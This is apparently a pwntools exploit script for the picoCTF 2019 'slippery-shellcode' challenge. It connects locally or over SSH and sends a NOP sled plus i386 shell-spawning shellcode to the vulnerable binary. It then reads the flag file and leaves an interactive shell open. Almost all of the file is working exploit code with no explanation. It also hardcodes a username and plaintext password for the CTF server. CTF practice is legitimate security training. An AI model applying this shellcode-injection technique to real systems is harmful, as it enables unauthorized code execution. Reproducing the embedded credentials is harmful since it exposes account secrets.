#!/usr/bin/python3

from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  # if DEBUG:
  #   attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='tjf952', password="thomasfinn952")
  sh = s.process('/problems/slippery-shellcode_0_7440dd178b8f0686410008ac1268d808/vuln')
  REMOTE = True


sh.sendlineafter(':\n', '\x90'*256+asm(shellcraft.i386.linux.sh()))
sh.sendlineafter('$ ', 'cat /problems/slippery-shellcode_0_7440dd178b8f0686410008ac1268d808/flag.txt')
sh.interactive()